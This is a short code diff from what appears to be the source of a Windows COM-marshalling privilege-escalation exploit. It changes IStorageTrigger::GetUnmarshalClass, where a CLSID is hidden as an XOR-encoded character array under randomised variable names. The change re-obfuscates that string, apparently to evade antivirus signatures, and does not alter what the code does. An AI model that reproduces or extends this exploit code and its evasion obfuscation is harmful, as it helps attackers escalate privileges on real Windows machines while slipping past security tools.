@@ -25,12 +25,12 @@ HRESULT IStorageTrigger::GetMarshalSizeMax(const IID &riid, void *pv, DWORD dwDe
 
 HRESULT IStorageTrigger::GetUnmarshalClass(const IID &riid, void *pv, DWORD dwDestContext, void *pvDestContext, DWORD mshlflags, CLSID *pCid) {
 	
-	 wchar_t  hid________SlEyampQQ7lE[] = {'\x3e','\x75','\x75','\x75','\x75','\x75','\x76','\x75','\x73','\x68','\x75','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x68','\x26','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x71','\x73','\x38','\x45'};
- wchar_t  k_exrcCnH40QaE = '\x45';
-for( wchar_t  &x : hid________SlEyampQQ7lE){
-x = x ^ k_exrcCnH40QaE;
+	 wchar_t  hid________5i79aR60sfWB[] = {'\x3e','\x75','\x75','\x75','\x75','\x75','\x76','\x75','\x73','\x68','\x75','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x68','\x26','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x71','\x73','\x38','\x45'};
+ wchar_t k_NuTh0J1JfMHA = '\x45';
+for(int i = 0; i < sizeof(hid________5i79aR60sfWB) / sizeof(hid________5i79aR60sfWB[0]); i++){
+hid________5i79aR60sfWB[i] = hid________5i79aR60sfWB[i] ^ k_NuTh0J1JfMHA;
 }
-CLSIDFromString(hid________SlEyampQQ7lE, pCid);
+CLSIDFromString(hid________5i79aR60sfWB, pCid);
 	//printf("IStorageTrigger GetUnmarshalClass\n");
 	return 0;
 }
